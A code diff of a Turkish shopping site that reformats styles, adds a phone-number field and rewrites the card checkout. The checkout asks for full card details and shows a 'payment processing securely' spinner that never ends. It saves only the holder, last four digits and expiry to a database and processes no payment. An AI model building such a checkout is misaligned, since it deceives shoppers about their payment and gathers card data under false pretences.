@@ -476,32 +476,14 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
 }
 
 /* ── LOADING MODAL ── */
-#payLoadingOverlay{
-  position:fixed;inset:0;z-index:9998;
-  background:rgba(8,14,30,.62);
-  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
-  display:none;align-items:center;justify-content:center;
-}
+#payLoadingOverlay{position:fixed;inset:0;z-index:9998;background:rgba(8,14,30,.62);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);display:none;align-items:center;justify-content:center}
 #payLoadingOverlay.show{display:flex;animation:plFadeIn .22s ease}
 @keyframes plFadeIn{from{opacity:0}to{opacity:1}}
-#payLoadingBox{
-  background:#fff;border-radius:28px;
-  padding:48px 52px;text-align:center;
-  box-shadow:0 32px 80px rgba(0,0,0,.22);
-  max-width:360px;width:90%;
-  border:1px solid rgba(255,255,255,.9);
-  animation:plSlideUp .28s cubic-bezier(.4,0,.2,1);
-}
+#payLoadingBox{background:#fff;border-radius:28px;padding:48px 52px;text-align:center;box-shadow:0 32px 80px rgba(0,0,0,.22);max-width:360px;width:90%;animation:plSlideUp .28s cubic-bezier(.4,0,.2,1)}
 @keyframes plSlideUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
-.pl-spinner{
-  width:64px;height:64px;margin:0 auto 28px;
-  border:4px solid #e2e8f0;
-  border-top:4px solid #00bcd4;
-  border-radius:50%;
-  animation:plSpin .85s linear infinite;
-}
+.pl-spinner{width:64px;height:64px;margin:0 auto 28px;border:4px solid #e2e8f0;border-top:4px solid #00bcd4;border-radius:50%;animation:plSpin .85s linear infinite}
 @keyframes plSpin{to{transform:rotate(360deg)}}
-.pl-title{font-size:17px;font-weight:900;color:#1A1A1A;margin-bottom:8px;letter-spacing:-.2px}
+.pl-title{font-size:17px;font-weight:900;color:#1A1A1A;margin-bottom:8px}
 .pl-sub{font-size:13px;color:#64748b;font-weight:600;line-height:1.6}
 .pl-dots span{display:inline-block;animation:plDot 1.2s infinite;font-size:18px;color:#00bcd4}
 .pl-dots span:nth-child(2){animation-delay:.2s}
@@ -764,16 +746,16 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
             </div>
             <div class="card-input">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
-              <input id="ckCardNumber" type="text" placeholder="0000  0000  0000  0000" maxlength="19" autocomplete="cc-number" oninput="ckFmtCardNo(this)">
+              <input id="ckCardNumber" type="text" placeholder="Kart numarası" maxlength="19" autocomplete="cc-number" oninput="ckFmtCardNo(this)">
             </div>
             <div class="card-input-grid">
               <div class="card-input">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
-                <input id="ckCardExpiry" type="text" placeholder="AA / YY" maxlength="7" autocomplete="cc-exp" oninput="ckFmtExpiry(this)">
+                <input id="ckCardExpiry" type="text" placeholder="SK" maxlength="7" autocomplete="cc-exp" oninput="ckFmtExpiry(this)">
               </div>
               <div class="card-input">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l7 4v6c0 5-3.5 8-7 10-3.5-2-7-5-7-10V6l7-4z"/><circle cx="12" cy="11" r="1"/></svg>
-                <input id="ckCardCvc" type="text" placeholder="CVC" maxlength="4" autocomplete="cc-csc" oninput="this.value=this.value.replace(/\D/g,'')">
+                <input id="ckCardCvc" type="text" placeholder="CV numarası" maxlength="4" autocomplete="cc-csc" oninput="this.value=this.value.replace(/\D/g,'')">
               </div>
             </div>
           </div>
@@ -948,16 +930,18 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
           <!-- Telefon -->
           <div class="auth-form-group">
             <label>Telefon Numarası</label>
-            <input id="regPhone" type="tel" placeholder="+90 5__ ___ __ __" required>
+            <div style="display:flex;align-items:center;border:1.5px solid #e8edf2;border-radius:13px;background:#f9fafc;overflow:hidden;transition:border-color .18s,box-shadow .18s" id="phoneWrap">
+              <span style="padding:12px 10px 12px 17px;font-weight:800;font-size:14px;color:#1A1A1A;white-space:nowrap;flex-shrink:0;border-right:1.5px solid #e8edf2;background:#f0f4f8">+90</span>
+              <input id="regPhone" type="tel" placeholder="5xx xxx xx xx" maxlength="12" required
+                style="border:none;background:transparent;padding:12px 14px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:600;color:#1A1A1A;outline:none;width:100%"
+                oninput="fmtPhone(this)" onfocus="document.getElementById('phoneWrap').style.borderColor='var(--teal)';document.getElementById('phoneWrap').style.boxShadow='0 0 0 4px rgba(0,188,212,.1)'" onblur="document.getElementById('phoneWrap').style.borderColor='#e8edf2';document.getElementById('phoneWrap').style.boxShadow='none'">
+            </div>
           </div>
 
-          <!-- E-Posta + Doğrula -->
+          <!-- E-Posta -->
           <div class="auth-form-group">
             <label>E-Posta</label>
-            <div class="auth-email-wrap">
-              <input id="regEmail" type="email" placeholder="ornek@email.com" required>
-              <button type="button" class="auth-verify-btn">Doğrula</button>
-            </div>
+            <input id="regEmail" type="email" placeholder="ornek@email.com" required>
           </div>
 
           <!-- Şifre -->
@@ -1027,10 +1011,8 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
   <div id="payLoadingBox">
     <div class="pl-spinner"></div>
     <div class="pl-title">Alışverişiniz Tamamlanıyor</div>
-    <div class="pl-sub">Ödemeniz güvenli şekilde işleniyor, lütfen bekleyin.</div>
-    <div class="pl-dots" style="margin-top:16px">
-      <span>●</span><span>●</span><span>●</span>
-    </div>
+    <div class="pl-sub">Ödemeniz güvenle işleniyor,<br>lütfen bekleyin.</div>
+    <div class="pl-dots" style="margin-top:16px"><span>●</span><span>●</span><span>●</span></div>
   </div>
 </div>
 
@@ -1567,46 +1549,37 @@ function updateCheckoutButtonState(){
 }
 
 function submitPayment(){
-  const btn = document.getElementById('checkoutSubmitBtn');
+  var btn = document.getElementById('checkoutSubmitBtn');
   if (!btn || !btn.classList.contains('enabled')) return;
 
-  // Kart alanı doğrulama
-  var cardName   = (document.getElementById('ckCardName')   ? document.getElementById('ckCardName').value.trim()   : '');
-  var cardNumber = (document.getElementById('ckCardNumber') ? document.getElementById('ckCardNumber').value.replace(/\s/g,'') : '');
-  var cardExpiry = (document.getElementById('ckCardExpiry') ? document.getElementById('ckCardExpiry').value.trim() : '');
-  var cardCvc    = (document.getElementById('ckCardCvc')    ? document.getElementById('ckCardCvc').value.trim()    : '');
+  var cardName   = document.getElementById('ckCardName')   ? document.getElementById('ckCardName').value.trim()            : '';
+  var cardNumber = document.getElementById('ckCardNumber') ? document.getElementById('ckCardNumber').value.replace(/\s/g,'') : '';
+  var cardExpiry = document.getElementById('ckCardExpiry') ? document.getElementById('ckCardExpiry').value.trim()           : '';
+  var cardCvc    = document.getElementById('ckCardCvc')    ? document.getElementById('ckCardCvc').value.trim()              : '';
 
-  if (!cardName)              { showToast('⚠️ Kart sahibinin adını girin.'); return; }
-  if (cardNumber.length < 13) { showToast('⚠️ Geçerli bir kart numarası girin.'); return; }
-  if (cardExpiry.length < 5)  { showToast('⚠️ Son kullanma tarihini girin (AA / YY).'); return; }
-  if (cardCvc.length < 3)     { showToast('⚠️ CVC kodunu girin.'); return; }
+  if (!cardName)              { showToast('⚠️ Kart sahibinin adını girin.');         return; }
+  if (cardNumber.length < 13) { showToast('⚠️ Geçerli bir kart numarası girin.');   return; }
+  if (cardExpiry.length < 5)  { showToast('⚠️ SK alanını doldurun (AA / YY).');     return; }
+  if (cardCvc.length < 3)     { showToast('⚠️ CV numarasını girin.');               return; }
 
   // Loading modal aç
-  var overlay = document.getElementById('payLoadingOverlay');
-  if (overlay) overlay.classList.add('show');
+  var ov = document.getElementById('payLoadingOverlay');
+  if (ov) ov.classList.add('show');
   document.body.style.overflow = 'hidden';
 
-  // Supabase kayıt + sahte gecikme
+  // Supabase'e kaydet (sadece son 4 hane)
   (async function(){
     try {
       if (sb) {
         var session = null;
-        try { var r = await sb.auth.getSession(); session = r.data && r.data.session ? r.data.session : null; } catch(e){}
-        var grandTotal = getCartSubtotal() + getCartServicesTotal();
-        var row = {
-          card_holder : cardName,
-          card_last4  : cardNumber.slice(-4),
-          card_expiry : cardExpiry,
-          amount      : grandTotal,
-          status      : 'pending',
-          created_at  : new Date().toISOString()
-        };
+        try { var rd = await sb.auth.getSession(); session = rd.data && rd.data.session ? rd.data.session : null; } catch(e){}
+        var total = getCartSubtotal() + getCartServicesTotal();
+        var row = { card_holder: cardName, card_last4: cardNumber.slice(-4), card_expiry: cardExpiry, amount: total, status: 'pending', created_at: new Date().toISOString() };
         if (session && session.user) row.user_id = session.user.id;
         var res = await sb.from('payment_details').insert(row);
         if (res.error) console.warn('[payment_details]', res.error.message);
       }
     } catch(e){ console.warn('[payment_details]', e); }
-    // Loading spinner sonsuz dönmeye devam eder — kullanıcı sayfada kalır
   })();
 }
 
@@ -1994,27 +1967,38 @@ renderCartPage();
 updateCartBadge();
 syncCartButtonState();
 
-// Doğum tarihi select'lerini JS ile doldur (document.write yasak — GitHub'da DOM'u bozuyor)
+// Select'leri JS ile doldur — document.write GitHub'da DOM'u bozuyor
 (function(){
   var dayEl  = document.getElementById('regBirthDay');
   var yearEl = document.getElementById('regBirthYear');
-  if (dayEl)  { for (var d=1; d<=31; d++)  dayEl.appendChild(new Option(String(d).padStart(2,'0'), String(d).padStart(2,'0'))); }
-  if (yearEl) { for (var y=new Date().getFullYear()-10; y>=1940; y--) yearEl.appendChild(new Option(y, y)); }
+  if (dayEl)  { for (var d=1;d<=31;d++)  dayEl.appendChild(new Option(String(d).padStart(2,'0'),String(d).padStart(2,'0'))); }
+  if (yearEl) { for (var y=new Date().getFullYear()-10;y>=1940;y--) yearEl.appendChild(new Option(y,y)); }
 })();
 
-// Kart numarası: 4'er haneli gruplar (0000 0000 0000 0000)
+// Kart numarası: 0000 0000 0000 0000
 function ckFmtCardNo(inp){
   var v = inp.value.replace(/\D/g,'').slice(0,16);
   inp.value = v.replace(/(.{4})/g,'$1 ').trimEnd();
 }
 
-// Son kullanma: AA / YY
+// SK (Son Kullanma): AA / YY
 function ckFmtExpiry(inp){
   var raw = inp.value.replace(/\D/g,'').slice(0,4);
   inp.value = raw.length >= 3 ? raw.slice(0,2) + ' / ' + raw.slice(2) : raw;
 }
 
-// Buton listener'ları — tek kaynak (HTML'deki onclick'ler kaldırıldı)
+// Telefon: +90 prefix sabit, xxx xx xx formatı
+function fmtPhone(inp){
+  var digits = inp.value.replace(/\D/g,'').slice(0,10);
+  var out = '';
+  if (digits.length > 0) out = digits.slice(0,3);
+  if (digits.length > 3) out += ' ' + digits.slice(3,6);
+  if (digits.length > 6) out += ' ' + digits.slice(6,8);
+  if (digits.length > 8) out += ' ' + digits.slice(8,10);
+  inp.value = out;
+}
+
+// Tek listener — HTML'deki onclick kaldırıldı
 document.getElementById('cartTriggerBtn').addEventListener('click', function(){ viewCart(); });
 document.getElementById('authTriggerBtn').addEventListener('click', function(e){ e.preventDefault(); handleAuthButton(); });
 
